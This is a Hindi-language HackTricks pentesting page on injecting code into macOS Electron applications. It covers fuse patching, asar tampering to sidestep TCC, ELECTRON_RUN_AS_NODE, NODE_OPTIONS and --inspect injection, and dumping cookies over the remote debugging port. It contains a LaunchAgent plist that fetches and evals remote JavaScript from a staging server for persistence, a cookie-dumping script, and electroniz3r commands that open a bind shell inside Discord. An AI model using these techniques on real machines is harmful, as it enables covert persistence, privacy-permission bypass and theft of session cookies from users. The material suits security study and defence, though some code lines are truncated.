# macOS इलेक्ट्रॉन एप्लिकेशन इंजेक्शन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **हैकिंग ट्रिक्स साझा करें और PR जमा करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में**.

</details>

## मूलभूत जानकारी

यदि आपको पता नहीं है कि इलेक्ट्रॉन क्या है, तो आप [**यहां बहुत सारी जानकारी पा सकते हैं**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)। लेकिन अब तक यह जान लें कि इलेक्ट्रॉन **नोड** चलाता है।\
और नोड के पास कुछ **पैरामीटर** और **एनवायरनमेंट वेरिएबल्स** होते हैं जिनका उपयोग किया जा सकता है **निर्दिष्ट फ़ाइल** के अलावा **अन्य कोड को चलाने** के लिए।

### इलेक्ट्रॉन फ्यूज़

इन तकनीकों पर चर्चा की जाएगी, लेकिन हाल के समय में इलेक्ट्रॉन ने इन्हें रोकने के लिए कई **सुरक्षा ध्वज** जोड़े हैं। ये हैं [**इलेक्ट्रॉन फ्यूज़**](https://www.electronjs.org/docs/latest/tutorial/fuses) और ये वे हैं जो macOS में इलेक्ट्रॉन ऐप्स को **अनियमित कोड लोड** से **रोकने** का उपयोग करते हैं:

* **`RunAsNode`**: यदि यह अक्षम है, तो यह एनवायरनमेंट वेरिएबल **`ELECTRON_RUN_AS_NODE`** का उपयोग करने को रोकता है कोड इंजेक्शन करने के लिए।
* **`EnableNodeCliInspectArguments`**: यदि यह अक्षम है, तो `--inspect`, `--inspect-brk` जैसे पैरामीटर्स को समझा नहीं जाएगा। इस तरह कोड इंजेक्शन को रोकने का तरीका।
* **`EnableEmbeddedAsarIntegrityValidation`**: यदि यह सक्षम है, तो macOS द्वारा लोड किए गए **`asar`** **फ़ाइल** की **मान्यता** की जाएगी। इस तरह कोड इंजेक्शन को रोकने का तरीका है इस फ़ाइल की सामग्री को संशोधित करके।
* **`OnlyLoadAppFromAsar`**: यदि यह सक्षम है, तो निम्नलिखित क्रम में लोड करने की जगह खोजने की बजाय: **`app.asar`**, **`app`** और अंत में **`default_app.asar`**। यह केवल app.asar की जांच और उपयोग करेगा, इसलिए यह सुनिश्चित करेगा कि **`embeddedAsarIntegrityValidation`** फ्यूज़ के साथ मिलाकर गैर-मान्यता प्राप्त कोड लोड करना **असंभव** है।
* **`LoadBrowserProcessSpecificV8Snapshot`**: यदि यह सक्षम है, तो ब्राउज़र प्रोसेस अपने V8 स्नैपशॉट के लिए `browser_v8_context_snapshot.bin` नामक फ़ाइल का उपयोग करता है।

एक और दिलचस्प फ्यूज़ जो कोड इंजेक्शन को रोकने वाला नहीं होगा है:

* **EnableCookieEncryption**: यदि यह सक्षम है, तो डिस्क पर कुकी स्टोर को ओएस स्तरीय गणना कुंजी का उपयोग करके एन्क्रिप्ट किया जाता है।

### इलेक्ट्रॉन फ्यूज़ की जांच करना

आप एक एप्लिकेशन से **इन ध्वजों की जांच** कर सकते हैं:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron फ्यूज़ को संशोधित करना

जैसा कि [**दस्तावेज़**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode) में उल्लेख किया गया है, **Electron फ्यूज़** की विन्यासित कॉन्फ़िगरेशन **Electron बाइनरी** में कॉन्फ़िगर की जाती है जिसमें कहीं न कहीं तार **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** होता है।

macOS एप्लिकेशन में यह आमतौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होता है।
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस फ़ाइल को [https://hexed.it/](https://hexed.it/) में लोड कर सकते हैं और पिछले स्ट्रिंग की खोज कर सकते हैं। इस स्ट्रिंग के बाद आप ASCII में एक नंबर "0" या "1" देख सकते हैं जो प्रत्येक फ्यूज़ को अक्षम या सक्षम करता है। हेक्स कोड (`0x30` `0` है और `0x31` `1` है) को संशोधित करके **फ्यूज़ मान** को संशोधित करें।

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इन संशोधित बाइट्स के साथ एक ऐप्लिकेशन के भीतर **`Electron Framework` बाइनरी** को **अधिलेखित** करने का प्रयास करते हैं, तो ऐप नहीं चलेगी।

## Electron ऐप्लिकेशन में कोड जोड़ने के लिए RCE

एक Electron ऐप्लिकेशन द्वारा उपयोग किए जा रहे **बाहरी JS/HTML फ़ाइलें** हो सकती हैं, इसलिए एक हमलावर को इन फ़ाइलों में कोड संशोधित करने की अनुमति हो सकती है जिसका हस्ताक्षर जांचा नहीं जाएगा और ऐप के संदर्भ में अनियमित कोड को निष्पादित कर सकता है।

{% hint style="danger" %}
हालांकि, वर्तमान में 2 सीमाएं हैं:

* **`kTCCServiceSystemPolicyAppBundles`** अनुमति की आवश्यकता होती है एक ऐप को संशोधित करने के लिए, इसलिए डिफ़ॉल्ट रूप से यह अब संभव नहीं है।
* संकलित **`asap`** फ़ाइल में आमतौर पर फ्यूज़ **`embeddedAsarIntegrityValidation`** और **`onlyLoadAppFromAsar`** सक्षम होते हैं

जिससे यह हमला मार्ग अधिक कठिन (या असंभव) हो जाता है।
{% endhint %}

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की आवश्यकता को अवगत करने के लिए ऐप्लिकेशन की कॉपी को एक अन्य निर्देशिका (जैसे **`/tmp`**) में कॉपी करके, फ़ोल्डर को **`app.app/Contents`** से **`app.app/NotCon`** के नाम से पुनर्नामित करके, अपने **विषादी** कोड के साथ **asar** फ़ाइल को संशोधित करके, इसे फिर से **`app.app/Contents`** के नाम से पुनर्नामित करके और इसे निष्पादित करने के लिए संशोधित करना संभव है।

## `ELECTRON_RUN_AS_NODE` के साथ RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**दस्तावेज़ीकरण**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) के अनुसार, यदि इस env चर को सेट किया जाता है, तो यह नॉर्मल नोड.जेएस प्रक्रिया के रूप में प्रक्रिया शुरू करेगा।

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
यदि फ्यूज **`RunAsNode`** अक्षम हो जाता है तो env वेरिएबल **`ELECTRON_RUN_AS_NODE`** को अनदेखा किया जाएगा, और यह काम नहीं करेगा।
{% endhint %}

### ऐप प्लिस्ट से इंजेक्शन

[**यहां प्रस्तावित**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) के रूप में, आप प्लिस्ट में इस env वेरिएबल का दुरुपयोग करके स्थिरता बनाए रखने के लिए इस्तेमाल कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` के साथ RCE

आप एक अलग फ़ाइल में पेलोड संग्रहीत कर सकते हैं और इसे निष्पादित कर सकते हैं:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
यदि फ्यूज **`EnableNodeOptionsEnvironmentVariable`** **अक्षम** है, तो ऐप वातावरण चर **NODE\_OPTIONS** को अनदेखा करेगा जब तक वातावरण चर **`ELECTRON_RUN_AS_NODE`** सेट न हो, जिसे फ्यूज **`RunAsNode`** भी **अक्षम** होने की स्थिति में अनदेखा किया जाएगा।
{% endhint %}

### ऐप प्लिस्ट से इंजेक्शन

आप इस वातावरण चर का दुरुपयोग करके प्लिस्ट में स्थायित्व बनाए रखने के लिए इन कुंजीयों को जोड़ सकते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## इंस्पेक्शन के साथ आरसीई

[**इस**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) के अनुसार, यदि आप **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे फ्लैग्स के साथ इलेक्ट्रॉन एप्लिकेशन को चलाते हैं, तो एक **डीबग पोर्ट खुल जाएगा** जिस पर आप कनेक्ट कर सकते हैं (उदाहरण के लिए `chrome://inspect` में से क्रोम से) और आप उस पर **कोड इंजेक्शन कर सकेंगे** या नए प्रोसेस चला सकेंगे।\
उदाहरण के लिए:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
अगर fuse**`EnableNodeCliInspectArguments`** अक्षम है, तो ऐप नोड पैरामीटर (जैसे `--inspect`) को अनदेखा करेगा जब शुरू किया जाता है, जब तक env वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट नहीं होता है, जो अनदेखा किया जाएगा अगर fuse **`RunAsNode`** अक्षम है।

हालांकि, आप अभी भी **electron पैरामीटर `--remote-debugging-port=9229`** का उपयोग कर सकते हैं, लेकिन पिछला पेलोड अन्य प्रक्रियाओं को निष्पादित करने के लिए काम नहीं करेगा।
{% endhint %}

पैरामीटर **`--remote-debugging-port=9222`** का उपयोग करके Electron ऐप से कुछ जानकारी चुरा सकते हैं, जैसे कि **इतिहास** (GET कमांड के साथ) या ब्राउज़र के **कुकीज़** (जैसे कि वे ब्राउज़र के अंदर **डिक्रिप्ट** होते हैं और उन्हें देने वाला एक **json एंडपॉइंट** होता है)।

आप यह कैसे कर सकते हैं इसे यहां सीख सकते हैं [**यहां**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहां**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) और ऑटोमेटिक टूल [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या एक सरल स्क्रिप्ट का उपयोग करें:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### ऐप Plist से इंजेक्शन

आप इस env variable का उपयोग करके प्लिस्ट में इंजेक्शन कर सकते हैं ताकि स्थायित्व बनाए रख सकें, इन कुंजीयों को जोड़कर:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC बाइपास पुराने संस्करणों का दुरुपयोग करके

{% hint style="success" %}
macOS का TCC डेमन एप्लिकेशन के निष्पादित संस्करण की जांच नहीं करता है। इसलिए, यदि आप किसी भी पिछले तकनीक के साथ कोई इलेक्ट्रॉन एप्लिकेशन में कोड संयोजित नहीं कर सकते हैं, तो आप पिछले संस्करण के एप्लिकेशन को डाउनलोड करके उसमें कोड संयोजित कर सकते हैं क्योंकि इसे अभी भी TCC विशेषाधिकार प्राप्त हो जाएंगे।
{% endhint %}

## स्वचालित संयोजन

टूल [**electroniz3r**](https://github.com/r3ggi/electroniz3r) का उपयोग आसानी से किया जा सकता है **इंस्टॉल किए गए विकल्प इलेक्ट्रॉन एप्लिकेशन खोजने** और उन पर कोड संयोजित करने के लिए। यह उपकरण **`--inspect`** तकनीक का उपयोग करने की कोशिश करेगा:

आपको इसे खुद कंपाइल करना होगा और इसे इस तरह से उपयोग कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## संदर्भ

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह!
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>
